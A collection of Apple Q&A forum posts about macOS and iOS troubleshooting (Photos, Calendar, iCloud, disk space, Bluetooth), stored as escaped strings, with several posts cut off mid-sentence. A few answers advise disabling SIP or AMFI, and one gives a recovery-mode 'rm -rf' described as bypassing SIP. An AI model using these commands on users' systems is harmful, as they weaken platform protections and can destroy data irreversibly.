turned off partially (csrutil enable --without kext)\n\n*✅ After uninstalling the kernel extension AND reenabling SIP fully again, Apple Photos face detection and curation works again!\n\n*❓ I'm not sure whether the stuck photoanalysisd was caused by the particular kernel extension or the absence of SIP. But it was certainly one of the both. Because I have intensively tested and observed over the last months.\n\n*Isolating the exact cause (SIP or kernel extension) would again take me 3-4 hours as this requires rebooting and a lot of observation. If someone wants to do this, feel free to do so, and share here please!\n\n*What I can tell you: Uninstalling SsdPmEnabler and re-enabling SIP definitely fixes it!\n\nSo glad that I can share this with you after having tried so much over many months! Hope this helps some folks! \n\nA: Repair the library\nThen it's fixed. Then if needed again give photoanalysisd some time to kick in.

Yes/No?\" or \"This is: … -> Y\" .\n\nOriginal and edited versions of photos: When you edit a photo in Photos, it actually keeps around two copies of the photo: the unedited original, and a new JPG version that contains your edits. This allows you to later discard your edits and revert to the original version of the photo if you wish. PowerPhotos can copy both the original and edited versions of each photo, keeping reversible edits intact in the destination library, as well as RAW+JPG pairs. If you wish, you can choose to copy only the original or the edited version of each photo in the preferences window, rather than keeping both. The original versions of video files will always be copied regardless of the setting you have chosen.\n\n❌ Copies original + rendered-edit but not the edit-instructions which create that rendered-edit.\n\n*\n\n*Interestingly from your iPhone you could once get IMG_0123.JPG + a sidecar file like IMG_0123.EDIT and that actually contained exactly those edit-instructions/settings (I think in XML/).\n\n\n*Hence you loose comfort and quality when in need to further edit the image.\n\n*\n\n*Either you start with your edit: Then all the tweaking knobs are effectively false. Because technically all knobs are on their default position. So all the scales will be distorted.\n\n\n*Or you revert to the original and try to re-create the editing effect from scratch. Also not so comfortable. Sad that Apple does not allow you exporting original + edit-instruction-sidecar-file which upon import to a new library would be auto-applied (and copied to the corresponding database entry for the master file).\n\nA: I finally solved this problem.\nfollowing step\n\n*\n\n*copy photo library to external disk.\n\n\n*delete original library.\n\n\n*Running photo.app so create new photo library.\n\n\n*Read pictures from copied library.\n\n\n*Then DONE.\nex.\nMy original photo library was 384G(call \"lib O\") at MBP. However, when I made a new library(call \"lib N\") and load photos lib O to this lib N library, it became 74G in lib N's size. It was hard to imagine that I had 300G of data in a cache, so I came up with this method.\nBut Finally lib N size 425.01GB today.\nApple Genius say that loading from the library is a new function from Mac OS Monterey.\n\nA: iCloud on/off/re-syncing based approaches\n\n*\n\n*❗️ I rule iCloud out as a factor as I suffer the same issue on the local-only extra library even if transplanted into a freshly created user account.\n\n*\n\n*See 3a) of the question.\n\n\n\n", "Q: Late 2015 iMac frequent kernel panics I have performed memtests that result in no failures, as well as tested the health of the 1TB SSD in this machine.

I can't exit Guided Access on iPad... the password prompt won't accept any input.\n\nHere are the details: I have a brand new 2021 10.2\" iPad (9th gen) running iPad OS 15.0.2. It is to be used as a kiosk interface. Basically, it will just run a website (that looks like an app) with Guided Access turned on to prevent users from navigating away from the website.\nI enter Guided Access mode with a triple-tap of the home button. To exit Guided Access, it's the same triple-tap. This will bring up the password dialog, but I cannot type anything on screen. None of the password buttons (or Cancel or delete) are responsive to taps. And since I can't exit Guided Access, the only thing I can do is hard restart the iPad... which, thankfully, brings the iPad back with Guided Access off.\nI've replicated the exact setup on an older 11\" iPad Pro (2018) running iPad OS 15.0.2 and was able to enter and exit Guided Access without issue. No problems typing the password.\nAm I doing something wrong? Or is there a glitch with Guided Access and the 2021 iPads?\n\nP.S. Sorry about the crappy photo... as I'm in Guided Access, I can't take a screenshot!\n\nA: I'm happy to report that this bug was fixed in the iPad OS 15.1 release (October 25, 2021).\n", "Q: “MDM” for Home use? Good Hello… I was wondering if there was an equivalent to an MDM for home use… I have a number of Apple devices, and (this may sound lazy) instead of running around, tracking them down and updating them 1-by-1, I would like the ability to just push out the updates from my Mac… I thought RDC used to do this, but I must have been dreaming…\n\nA: Here was my solution, it's not the best but it works for me.\nI used Apple Configurator to erase and set my kids iPhones up as a a supervised device. From there, I got them all set up as a new user.\nI created a few different configuration profiles with all of the settings I would like. 1 of them has all the wireless access points they might need, the other is the restrictions.\nI set all of the restrictions that they can and can not do, set the apps they are only allowed to have, and set the content ratings. In this, I also hide the App Store.\nFrom there, I used Screen Time to set their usage for the apps that they have remaining. They can't really use the device after bedtime unless they ask for it, like listening to audible books, etc...\nMy only drawback is that I need to manually update the apps on the device by removing the restrictions profile. But this does allow me to get my hands on the device to make sure everything is ok.\nI hope that helps, it's kind of a quick overview.\n\nA: I have kinda tinkered with Apple Configurator and have looked at JAMF, but get lost at the whole “Name of Organization” and making a certificate… Configurator won’t allow me to use my home email/Apple ID address, so get kinda stuck there…\n\nA: ... and I did just find this article which talks about using Configurator in a home environment, so perhaps I'll take a closer look...\n", "Q: Sharing from macOS with Linux guest I need to share a directory from macOS and access it from Linux.\nWhat is my best option, SMB or AFP (I am not mentioning NFS because I read of its poor performance)?

Enlarging the window vertically just stretches the hours to be taller too.\n\nA: In macOS Big Sur in Calendar, one can show from 6 hours to 24 hours in Week view, the default is 12 hours, by changing the Show: [12] hours at a time preference in: Calendar > Preferences… > General\n\n", "Q: How to zoom in on Calendar? How can I show fewer or more hours at a time in Week view in Calendar.app without opening preferences every time?\nPinching does nothing for me, heightening or shortening the window just proportionally grows/shrinks the vertical size of each hour too so the same number of hours are shown no matter the window size.\n\nA: My guess would be that by default with having the, e.g. Show: [12] hours at a time preference in Calendar > Preferences… > General, that will be the only way to change the number of hours shown from within Calendar, regardless of the size of the window. I tested with various combinations of modifier keys and it didn't help to change the number of hours displayed.\nThat said, I did test doing it programmatically thru scripting and assigning a keyboard shortcut to an Automator Quick Action/Service and it does work.\n\n\nAlternate Solution\nCreate two Automator Quick Action/Service, with settings:\n\n*\n\n*Workflow receives [no input] in [Calendar]\nAdd a Run Shell Script action to each, with settings:\n\n*\n\n*Shell: [/bin/zsh]\n\n*Pass input: [to stdin]\nAdd the following example shell script code to the first one and save it as, e.g.:\n\n*\n\n*Zoom out Hours in Calendar\nExample shell script code:\ndeltaHours=2\ncurrentHours=$(defaults read com.apple.iCal 'number of hours displayed')\n[ $((currentHours + deltaHours)) -gt 24 ] && exit 0\ndefaults write com.apple.iCal 'number of hours displayed' -int $((currentHours + deltaHours))\n\nAdd the following example shell script code to the second one and save it as, e.g.:\n\n*\n\n*Zoom in Hours in Calendar\nExample shell script code:\ndeltaHours=2\ncurrentHours=$(defaults read com.apple.iCal 'number of hours displayed')\n[ $((currentHours - deltaHours)) -lt 6 ] && exit 0\ndefaults write com.apple.iCal 'number of hours displayed' -int $((currentHours - deltaHours))\n\n\nNotes:\nIn System Preferences > Keyboard > Shortcuts > Services I assigned each a keyboard shortcut of ⌘K and ⌥⌘K respectively.\nIn testing, I could press the assigned keyboard shortcut multiple time in a row quickly and have the number of hours displayed increase/decrease.\nThe example shell script code as currently coded  will increase/decrease by two hours with each pressing of the assigned keyboard shortcut.\nThe example shell script code, shown above, was tested in a Run Shell Script action as an Automator Quick Action/Service with keyboard shortcuts assigned under macOS Catalina and macOS Big Sur with Language & Region settings in System Preferences set to English (US) — Primary and worked for me without issue1.\n\n*\n\n*1  Assumes necessary and appropriate settings in System Preferences > Security & Privacy > Privacy have been set/addressed as needed.\n\n\n\nNote: The example shell script code is just that, an example, and sans any included error handling does not contain any additional error handling as may be appropriate, needed, or wanted.

How long should it take for photo people album to populate on new iPhone 13 pro?  5 days new, iOS 15.2 and pics have finished curation but no people have populated to the people folder in Photo app.\nApple senior advisor says he sees a lot of articles outlining issues/problems with app and people folder not populating for current iOS but I don’t seem to find a lot (recent) at all on the net.\nI have restarted the device many times, leave it plugged in every night and most of the day, reset memories and People suggestions in the photo settings, still nothing.\nAlso to add, when setting up the iPhone for the 1st time after purchase I used the over the air - copy settings, info, pictures, etc., from the old phone - by following the setup instructions and having the phones lay side by side while the old phone was copied to the new one.  Also, when I connected the new phone to the computer for the 1st time to back it up, Finder also synced Photos, music, etc., too, even though all that stuff was already on the iPhone.\nAnyhow, another night plugged in has gone by and still no people showing in the People Album.\nwhat to do to get people album to populate?\n10/27/21 Add info.....  so as of today, still no people added....   ive removed all synced photos from iPhone, deleted the iPod cache folder from MBP, reset memories and people folder again on iPhone , hard reset on iPhone and safe mode boot on MBP before re-syncing photos. Curation has completed on iPhone but as of yet, no people in People Album......\n10/30/21 - add info. still no faces for me in the People Album.  Added 2 screenshots - mine presently and my wife iPhone.  She only plugs in when needed and has 1 face and the language is different form my screen.  We are both now iOS 15.1 and sync photos the same way.\n11/25/21 - UPDATE.  received email form apple.  They are still trying to figure out why the album wont populate.  Still no joy!\n03/24/22 - UPDATE - Ive heard back form another senior advisor who confirmed that people/faces folder is suppose to scan and add automatically.  He said the fix was to update to iOS 15.4 and Monterey on Mac side and that the fix was in the updates.  When I told him that I have updated to both aprox 2 weeks ago and that the faces / people were still not be added he told me to contact another advisor that he'd been transferred to a different Dept.\nSo this add people / faces is still not working on my iPad or iPhone.  Confirmed AGAIN w/ Apple that this function is to happen automatically by the app.\n\n\n\n\n\nA: Post 2016 or so, the People album does not seem to update itself with new unnamed faces:\nWhy is Photos not suggesting new Faces in the People Album?\nIt's unclear if you've previously tagged/named faces in your library and/or if those tags have made it to your new phone.\n\nWant to see even more People in your album? Just open a photo of someone that you want to add, then swipe up to see a thumbnail of that person under People.\nhttps://support.apple.com/en-us/HT207103\n\nI would recommend going through your photos and manually tagging/naming 10-20 faces, as detected in the details of an individual photos. Once you have done that, the People album should update to show all of those People.\nThe album will continue to not show new unnamed faces. That's seemingly by design.\n", "Q: How do I remove iCloud downloads on Mac including ALL subfolders and files? I have a small SSD so I keep most of my files on iCloud and download only those files and folders I am working on. When I want to remove downloads from my Mac I right-click on a folder and select \"Remove Download\" but not all subfolders and files are removed, and I have to open each one up to remove them.\nHow can I select a high level folder and remove ALL downloaded subfolders and files in one command?\n\nA: I also had this question and was struggling to find an answer for a while. I did find a solution from \"Rakhesh\" on another website finally. Apple needs to just make this option available in Finder, but at least this is possible from Terminal. In Finder, right click the top-level folder you want to have all subfolders and files undownloaded and click \"new terminal at folder\". Then issue this command:\nfind . -type f -exec brctl evict {} \\;\n\n\nA: I agree with Korey's solution, but I have updated it a bit by using Automator!\n\nSetup:\nOpen Automator. Create a new Quick Action.\nSet \"Workflow receives current\" to \"folders\" in \"Finder\".\nDrag in a \"Run Shell Script\".\nIMPORTANT: Change \"Pass input\" to \"as arguments\"\nPaste in the following code:\ncd $1\nfind . -type f -exec brctl evict {} \\;\n\nSave (CMD+S). I saved mine as \"Remove Downloads (Recursively)\"\nUsing:\nThis will automatically be available under the Quick Actions menu. Simply select the folder, right click (CTRL+click), and the Quick Actions menu is near the bottom. You can also press CMD+SHIFT+P to toggle the preview window. You should see the action in the bottom right of your screen.\n\nHowever, I found it most useful to add a keyboard shortcut. This is a little different in macOS 13 (Ventura) and I personally hate it, but you can search the system settings for \"keyboard shortcut\". A new box will appear. Navigate to the \"Services\" tab and then the \"Files and Folders\" drop-down. Double-click where it says \"none\" and add your shortcut. I first tested a few shortcuts in Finder until I found one that prompted the \"error sound\".\nNOTE: After you save your shortcut, close settings and \"Relaunch\" finder (simply OPTION+right_click or OPTION+CTRL+click finder and click \"Relaunch\". Otherwise, it doesn't work!\n\nNow, I simply select the folder and press CMD+OPTION+R and it works. This is awesome!\n\nExplanation:\nThe \"New Terminal at Folder\" essentially is a \"cd /path/to/folder\" as the first line in the new terminal window. We've replaced this with passing in the action of selecting a file/folder. Thus, as long as we pass in the path to the folder, it should work just fine.\n", "Q: How can I copy an MP4 to my Apple TV and play it locally without the Apple TV Mac app? I want to play an MP4 clip on loop on my Apple TV (4th gen). But I want to do this in an area where the Wi-Fi signal is spotty (ruling out AirPlay). Apparently the Apple TV Mac app supports copying of MP4 files to the Apple TV, but Catalina is required, and I have reasons not to update to Catalina.\nI tried VLC for Apple TV, and it performed terribly. It couldn't even cache a 100MB MP4 and loop it - kept freezing and spinning a progress wheel. (It also refuses to remember the credentials to connect to my local network, which while not a deal-breaker, is very annoying.)\nSo what other options are there? Thanks.\n\nA: You are mixing up the Apple TV app for macOS with the Apple TV hardware device. It’s easy to get confused, they literally have the same name, but the document you reference refers only to the Apple TV app on macOS, not the Apple TV hardware device.\nAll of the video apps that I have seen for the Apple TV hardware device rely on streaming over the network, including the TV app, the Computers app, VLC, and Plex.\nI do not think you can do what you were trying to do by caching a file on the Apple TV hardware device. If you do not have WiFi, I don’t even think you can do what you want even with a local computer connected over an Ethernet cable. I think the Apple TV hardware device requires an internet connection even if it is just fetching files over a local network.\nI know there’s a lot of “I think” in all that, but I have 4 ATV’s and have some experience with how they work (and won’t work).\n", "Q: Is file sharing to iOS no longer available on iTunes for Windows?

If that doesn’t work, you’ll have to boot into recovery mode, open terminal, and rm -rf /Users/userName/Desktop/folder. This even bypasses SIP.

I believe Safari on Mac allows autofill of security codes texted to you, but I haven't seen a way to do this on Google Chrome on Mac. Is this possible?\n\nA: This website reports that it's possible:\n\nOn the Mac, it works while filling 2FA fields when a 2FA code appears in the Messages app on your iPhone. A prompt then appears below the 2FA field on the Mac and clicking it automatically fills the field.\n\n\nPrior to Big Sur, Security Code AutoFill was limited to Safari. However, with Big Sur, Apple has extended the feature to support third-party apps as well.\n\nHowever, I have never been able to get it to work even though I have SMS forwarding to my Macbook enabled.  The article notes\n\nDevelopers, although, have to explicitly include the feature within their apps if they want to add 2FA AutoFill functionality for users.\n\nIf any third party MacOS app would be willing to implement this, you'd think it would be Chrome, but as far as I can tell this has not been done.\n", "Q: Is it safe to use Mojave's Boot Camp Assistant to remove a Windows 7 partition?

However, you are still able to access the contents of this thread from within there, which Jean shows how to do, below.\nAll: please edit if I forgot anything.  Here are the steps\n\n*\n\n*Open Terminal\n\n*Drag, from the Finder, the file(s) or directories you wish to delete.  Drop the folder into Terminal.  This will simply make the path of the file(s) or folder(s) visible.

If the file contains a single certificate, it formats and displays the certificate very nicely, e.g., as below.\n\nHowever, if the file contains a certificate chain (multiple certificates one after another), then only the first one shows, and the finder is silent on the existence of additional certificates in the file. Is there any option or way to get it to show all the certificates? Or is the \"manual\" way (split into multiple files, each with one of the certs from the certificate chain, then view each one by one) the only way?\n\nA: Unfortunately in macOS 11 and earlier, there is no built-in way for the Finder's Quick View to show multiple certificates contained in a single file.\n", "Q: Big Sur - detect when Finder window has closed I'm running under Big Sur (macOS 11.6). I have a shell script which launches a Finder window to a certain directory as follows:\n/usr/bin/open /path/to/directory\n\nAfter the shell script opens this Finder window in that manner, I'd like that shell script to wait while periodically polling for the existence of that Finder window. Once that particular Finder window gets closed, I'd then like my shell script to stop waiting and continue processing.\nIs there a way to do this in macOS 11.6?\nThank you very much in advance.\n\nA: I figured out how to solve this.\nI repeatedly run the following command in my shell script in a loop, with a short sleep between loop iterations:\n/usr/bin/osascript -e 'tell application \"Finder\" to get the name of every window' | grep '/path/to/directory'\n\nAs soon as it stops finding a match, I break out of the loop, since it means that the Finder window for /path/to/directory has closed.\n", "Q: How would I export data from Python to spreadsheet (Apple Numbers Format)? I'm currently trying to automate the export of data from a Python script to Apple's .numbers spreadsheet. Currently, I export from Pandas using .csv.\nMy specific use-case is to update an existing column from pandas and update an existing Apple spreadsheet. \nThe spreadsheet can be seen in the screenshot. I want to update the column named Count and make sure it is correctly tied with the column named Item ID so that the script will update the row in the column Count such that it corresponds to the correct id in the cell from Item ID. I also plan on having the script add new entries to the table when a new item id is discovered in one of my storage containers and then to copy and paste the formula as if I dragged the formula down from the cell above it.\nI'm not asking for a full script to do all the things I ask as well that's not what this site is for, I'm just asking if there's a means of updating/saving a spreadsheet in the Apple Numbers format from Python. Thanks!\n\nA: As it often happens, there is a special package to do so. To install, run\npip install numbers-parser\n\nSuppose you have data you want to export, you either read it from the .numbers file, or modified somehow. For example, perform\ndoc = Document(\"old-sheet.numbers\")\nsheets = doc.sheets\ntables = sheets[0].tables\ntable = tables[0]\ntable.write(1, 1, \"This is new text\")\ntable.write(\"B7\", datetime(2020, 12, 25))\ndoc.save(\"new-sheet.numbers\")\n\nData can be taken from pandas (read the doc searching by pandas keyword).\nFull link to the packages PyPi docs: https://pypi.org/project/numbers-parser/\n", "Q: How to find out what app owns a menu bar item? One of the items in my menu bar is just blank. Totally transparent. How do I find out which app/program owns it?\n\nA: You can use Accessibility Inspector:\n\nApple provides the Accessibility Inspector testing tool that can be launched by choosing Xcode > Open Developer Tool > Accessibility Inspector in the menu bar or Dock. You can download Xcode from the Mac App Store for free.\n\nThen you can select the element on screen to get its properties. Here's more info.\nOnce you click on a Menu Item you have to check it's parent element. Here's how it works:\n\nAfter you click that arrow you can see the app name under Advanced -> Parent.\nThe item I've selected is BetterTouchTool:\n\n", "Q: I need to retrieve my password to get administrator access back in macOS High Sierra I have a MacBook Pro that I have forgotten my administrator password to.

How do I duplicate a photo before editing it on my iPad? When I first bought my Apple laptop years ago, there was a simple way to simply choose ‘duplicate picture’ and so you can go in and edit it while you keep the original intact. That functionality seems to have disappeared! Evolution or devolution?\n\nA: In Photos, tap the photo to select it, then tap the Action button (square with an upwards arrow) and then scroll down to the Duplicate command.\n", "Q: What app owns a menu bar item without installing XCode? How to identify a strange item on my menubar? says that XCode > Open Developer Tool > Accessibility Inspector can be used to find out what app/program has created a menu bar item.\nHow can I find out without installing XCode?\n\n\nA: In Script Editor, try the following command to see if it help gives any information to figure it out. BTW you can replace {name, title} with properties to get even more information:\ntell application \"System Events\" to return {name, title} of menu bar items of menu bar 1 of process \"ControlCenter\"\n\nIf it does not belong to process \"ControlCenter\", or it was not determined what it was, then try the following:\n\n*\n\n*Open Automator and create a new workflow.\n\n*Click the Record button (red dot).\n\n*Click the target menu item on the menu bar.\n\n*Stop the recording.\n\n*In the Watch Me Do action created by the recording, drag and drop the event to the open area just below the Watch Me Do action.\n\nIt should create a Run AppleScript action in which it should show the name of the application process to which it belongs.\nAs an example I clicked the icon for Hammerspoon and in the Run AppleScript action there was a line e.g.:\nset uiScript to \"click menu bar item 1 of menu bar 2 of application process \\\"Hammerspoon\\\"\n\n", "Q: Application get sigkill on launch When I launch certain applications, they don't launch. Running them in iTerm gets sigkill. Running them in gdb does not output any debug information. Running them with dtruss does not output any debug information. However, running them in a virtual machine (with SIP and amfi disabled) succeed, so it must be that something is wrong with my system's configuration. How can I start to troubleshoot this problem?\nNote: I saw relevant messages of amfid in Console.app and killed amfid, and then applications begin to freeze. (Problems I should expect for killing a system process. But what actually is amfid doing if I had already disabled it using the startup flag amfi_get_out_of_my_way=0x1? And it probably worked because I can create APFS snapshots using my own program I signed ad-hoc, which will just get a sigkill if amfi is enabled.)\nConsole.app messages:\n调试  22:19:00.631755 +0800

My Macbook pro has to charge overnight to get an even usable charge (usually 50%), and when I unplug the charger from it drops to around 1-6%. I just replaced the battery and coconut app says its fine, charging with enough watts, etc. Have no idea what is going on.\n\nEdit: should note, it only charges when off. When its on it claims its not charging. Unplugging the charger while its on causes it to drop or completely turn off.\n\nA: Logically, there are three possibilities:\na) the charger is faulty\nb) the power management unit is faulty\nc) the battery is faulty\nThe charger is the easiest to test: see if you can find another Magsafe 2 charger.\nRealistically, the other two need to be tested by an Apple Store or other authorised/qualified technician.\nApple don't sell replacement parts to the public, so any battery you bought will be a third-party attempt to match the specification (within costs). Printed text saying \"Designed by Apple\" etc is unlikely to be a guarantee of anything.\n", "Q: I have an apple tv and air pods max if I buy a iPad pro and change the bass I have an apple tv and air pods max if I buy an iPad pro and change the bass setting on the iPad will these bass settings transfer over to my apple tv and desktop mac? And seems I can't update my air pods without an iPad or iPhone.\n\nA: Yes and no.\nYes, you need an iOS / iPadOS device to set up equalizer settings and update the firmware on your AirPods in my experience.\nNo, I don’t see sound profiles transferring between devices currently.\n", "Q: Hard drive full no matter what I try I have run into the issue where no matter what files/applications I delete I cannot actually free up any disk space on my Early 2014 Macbook Air with 128GB of SSD storage.  The most recent exercise was to delete Xcode ~10GB.  Before the delete, the storage summary showed 3.6GB of free space.  After the delete, the storage summary showed ~4.8GB of free space.  What did change was the allocation between \"Applications\" and \"System\".  Before the delete, System was 82GB, and Applications was 20GB, afterwards, Applications went down to 11GB, and System went up to 92GB.\nHere are the items I have tried / won't consider trying:\n\n*\n\n*Yes, I have emptied the trash multiple times\n\n*Yes, I have booted into safe mode and then back into normal\n\n*No, I won't install a third-party piece of software to delete screensavers/applications backgrounds, logs. When interrogating Library and System folders those folders do not show 90GBs of usage they show something like ~10GB\n\n*Yes, I have tried finding the listing of Time Machine backups and deleting them (there are none listed)\n\nSo hopefully someone has encountered this issue and found a substantive solution.  I am personally wondering if the \"cloud\" drives I have installed are just consuming all of the free space (I have two providers).\nFor reference, I am running macOS 10.14 (Mojave)and I am unable to install the latest update because I cannot free up enough space on the system to do so!\n\nA: Debug what exactly is occupying your disk space. CleanMyMacX or Finder is not good for this, because it lacks permissions and doesn't include system files with root privileges. The solution below requires some manual work and OS understanding, since you're (was) using XCode i think you should be fine:\nThe solution for debugging disk space:\n\n*\n\n*Open up Terminal.App\n\n*cd /\n\n*sudo su\n\n*du -hs *\n\n*Look for weirdly unusual high folder sizes\n\n*cd \"/usr\" (for example)\n\n*du -hs *\n\nRepeat steps (5-7) till you find the weird looking files. Once you identify the problem look online for solution. Once, I had an error log filled up to 50GB, i did the following steps and solved the problem ;)\nOr you could simply try CleanMyMacX's Space Lense.\nGL\n", "Q: If I highlight and annotate a PDF in iBooks, will those highlights be kept if in Adobe Acrobat? If I highlight a PDF in iBooks on an iPhone and save the PDF, will those highlights be present if I open the PDF in Adobe Acrobat? Or vice versa?\n\nA: The PDF specification explicitly describes annotations and highlights, so any app that can read PDFs should be able to display them, and any app that saves PDFs should save them.\nApple's PDFKit produces annotations and highlights that are to spec, so they should be compatible with other readers. I would suggest it's a bug if they aren't.\nThe only non-standard implementation that I know of is that MacOS's Preview uses proprietary Bookmarks, which cannot be read by other non-Apple applications. Bookmarks from Acrobat and other PDF apps will appear in the Table of Contents sidebar in Preview and other Apple PDFKit-based apps.\n", "Q: How much memory/cpu is mds_stores consuming for you? I'm trying to figure out if the spotlight process \"mds_stores\" is consuming more resources than it should be. I've turned spotlight on and off and reindexed everything but it's still regularly using between 40 and 80% of the CPU on my lightly loaded system and chewing through insane amounts of memory even after a reboot. Right now, the real memory and private memory it's consuming is over 32 GB on a 64 GB machine. This doesn't seem normal to me.\nAs far as I can tell, Spotlight finished indexing my drive over a day ago yet mds_stores is still consuming a bunch of resources.\nI've told Spotlight to ignore my external drive and the caches. Is there anything else I can do?\n\nA: After reindexing everything again and waiting a full 48 hours, CPU usage has finally dropped down to normal levels, using just around .1% of CPU for mds_stores and mds. Memory is still pretty high at around 18 GB of memory. While indexing, this number went up to as high as 44 GB on a 64 GB machine.\nAnd it looks to me like mds_stores will continue to use a lot of resources even after the drives are indexed by Spotlight. Perhaps it is making the search index more efficient. At any rate, it took many, may hours to for this to happen before CPU usage dropped from roughly 50% to .1%. It could be a function of me having a 4 TB drive. I'm not sure.\nBut as far as I can tell, it seems to be working smoothly now.\n\nA: The system is designed to store data from the filesystem in memory so unless you need RAM for other things this is a benefit, intended and normal.\nBelow is a snapshot of a machine where I'm processing about 35 TB of data - rsync from several direct attached drives to other direct attached drives. About 900,000 files on each of the 5 connected drives, photos syncing, etc...\n\nI would look at your memory pressure graph in Activity Monitor and see what you see in terms of trends instead of one snapshot. Just because memory is allocated now, it can be de-allocated and freed in an instant if needed. Virtual memory is not like a physical warehouse where you have to move things out and it’s a problem to be 98% full. In fact, it’s the opposite, you are spending energy to keep RAM active always, so the system might as well use it all rather than waste it.\nFor context - here is the entire system memory contents sorted by the processes that allocate more RAM than others.\n\nThis Mac has been running for a month and mds_stores has used 9 minutes and 15 seconds of CPU time in that month.\n\n\nIn response to the comment that mds_stores does not grow and shrink, I run this command to check on it when I have a suspect \"spotlight\" issue:\n% sudo vmmap -resident -w mds_stores|grep footprint\nPhysical footprint:         102.0M\nPhysical footprint (peak):  352.4M\n\n", "Q: What is a program to display PDF's in a dark theme friendly fashion on MacOS? I am trying to read all my PDF's in dark theme, to preserve my vision since I work at a computer all day.\nAdobe Acrobat reader offers this feature, in that you can go into accessibility and change the background color and also the color of text. This would work great, except that on my machine, an M1 Mac Air, it constantly crashes, refuses to open, or just sits there consuming 100%+ CPU resources.\nIdeally I would like another program which at the least, will flip black and white text, and at best, would actually make the text and background a user-configurable color, like black and green.\nMost importantly, it won't crash constantly and hopefully be more lightweight than Adobe.\nAny help is much appreciated!!!\nEdit: this question may be a duplicate, check other answers here\nChange background colour for PDF when Viewing\n\nA: I like the Negative app: https://apps.apple.com/us/app/negative/id1378123825?mt=12\nor NightPDF:\nhttps://github.com/librepgp/NightPDF\n\nA: Try Foxit PDF Reader, you can choose the background color:\n\n\nA: I would try Apple’s preview app. It works for all my needs except when we have massively complicated layered PDF at work with all sorts of prepress data like ink levels embedded in the “PDF”\n", "Q: Find My 'Play Sound' notifications history Someone who's member of our iCloud family was in a funny mood and played with us by notifying some of our devices using the Play Sound feature in Find My app.\nAn email is sent telling that an alert has sounded on the device with hour and date but containing no other detail — so we wonder out of curiosity if we could find some sort of logs listing who could have triggered those alerts ?\nI can't find any information for this precise case, it always falls on iCloud accounts help or Find My features (We found out who it was after few minutes but couldn't tell at the time of the alerts ringing).\n\nA: I have an iCloud Family plan setup. Most of the devices are associated with my account, except for the kids and wife who all have their own iPhone or iPad. As a test, I just signed into my kids iCloud account. I was able to \"Find My\" iPhone that's next to me from my kid's account. So I guess there isn't a real way to see who did it, as nothing really told me which account sent the request.\nIf you think it's a child that is doing it, remove the app from their device, or use a configuration file to restrict the app from the device.\nGood luck!\n", "Q: Ctrl + a/e/f/b stopped working Usually, I use the following shortcuts on macOS:\n\n*\n\n*Ctrl + a: Go to the beginning of the line\n\n*Ctrl + e: Go to the end of the line\n\n*Ctrl + f: Go to the next character\n\n*Ctrl + b: Go to the previous character\n\nRecently these shortcuts stopped working. I don't know why. When I press Ctrl + a, some apps show nothing, some apps just show a. Is there any way to find out the reason and fix it?\nP.S.: I'm sure Ctrl works because all other shortcuts with the Ctrl key work.\n\nA: Generally in MacOS, Cmd is used where Windows and Linux use Ctrl.  But it depends on the app.  You didn't say which app you are expecting these functions in.  In most macOS apps, Cmd-a is \"select all\" and Cmd-f is \"find.\"\n", "Q: How to make sure my Mac isn't making a sound using its speakers? I'm working in an open space.

(Even when the Bluetooth indicator shows the AirPods are connected...)\nSo I want to make sure, that no matter what, sound isn't coming from the internal speakers, only from AirPods/Bose/other connected device.\n\nA: *\n\n*Select your Macs internal speakers as the output\n\n*Turn the volume to 0\n\nNow if for whatever reason output does not occur over your headphones your speakers will still be muted.\n", "Q: Prevent macOS Big Sur fom staying connected to bluetooth audio device when put to sleep/closing the lid I've got two MBPs and a pair of bluetooth headphones that can only be connected to two devices at once.\nI need to use this pair on both MBPs and my phone but only on one MBP at a time (usually, I can manually disconnect them from my phone in the rare event that I need to use them on both at the same time).\nAdditionally, the headphones are buggy/crappy and play an annoying ringing noise when they lose connection to a device AFAICT. I want to avoid this at all costs.\nWhen I walk away from an MBP, I close its lid. I would then like it to automatically disconnect any bluetooth audio device its connected to.\nI wouldn't mind having to connect to the headphones manually on the MBP I want to use them on but disconnecting manually is a no-go.\nThis thread is a duplicate but for an older macOS version (none of the solutions work in Big Sur).\nI'm aware that you could toggle bluetooth off completely but that's the nuclear \"solution\".\n\nA: There used to be an option in System Preferences to toggle Allow Bluetooth devices to wake this computer that might have solved your problem.\nIt looks like Apple have removed this in MacOS Monterey (12.2.1) for some reason.\nThe solution from this post on MacRumors solved the issue for me on my M1 MacBook so my headphones actually disconnected when I closed the lid:\nbrew install sleepwatcher blueutil\necho \"$(which blueutil) -p 0\" > ~/.sleep\necho \"$(which blueutil) -p 1\" > ~/.wakeup\nchmod 755 ~/.sleep ~/.wakeup\nbrew services restart sleepwatcher\n\nThis will disable Bluetooth when your MacBook goes to sleep, and enable it again when it wakes.\nIf you don't have brew, the installation instructions can be found at https://brew.sh\n\nA: You could use Automator / Apple Script to unpair this bluetooth device when the Mac goes to sleep.\nHere are two links from previous answer of this forum that could help you get started:\n\n*\n\n*Possible to run scripts on sleep and wake?\n\n*Is it possible to disconnect a bluetooth connection using Applescript?\n", "Q: How to run an uninstaller from an outdated .dmg?

Go back to a time the email was there.\nRecover.\nMail says 'Recovering', then goes back to an empty inbox.\nRinse & repeat until infuriated.\n\nA: I discovered the solution by accident, whilst testing something else.\nQuit Mail. Reboot the Mac. Launch Mail.\nCheck the sidebar. There is now a new item, com.apple.Mail.Backup.\nInside there are all your recovery attempts.\nEmail & attachment successfully recovered & manually moved to a safe folder 'On My Mac'.\n\nNow I can delete the recovered folders safely… well, maybe eventually after another restart. Right now they don't want to go anywhere. Contents deleted but folders still there.\nIn fact, several restarts & a rename later I managed to get rid of one folder, but the others are being somewhat tenacious. I guess I can live with that.\n\nFor users previously unaware of my despise for IMAP, this is one of the reasons I avoid using it. Deleting on one device deletes all copies.

This is happening to all of my monitors, one is an AOC I2276VWM and one is an Acer.\n\nA: macOS doesn't have any way of controlling the brightness of external monitors, that's only possible with third party apps that use DDC (Lunar, MonitorControl, DisplayBuddy) or dimming apps (Lunar Lite, QuickShade, f.lux).\nIf you're not using any of the above apps, then it's possible that you're noticing the effects of True Tone.\nIf disabling True Tone doesn't fix this, then it can be an incompatibility between the MacBook GPU and the monitors (although that's unlikely given that you notice the problem on two monitors of different brands)\n", "Q: Prevent SIGTERM & SIGKILL when using shutdown on macos Is there any way to prevent sending the sigterm & sigkill when using shutdown?\nI have a script which puts my mac to sleep, which contains shutdown -s to put my mac to sleep.

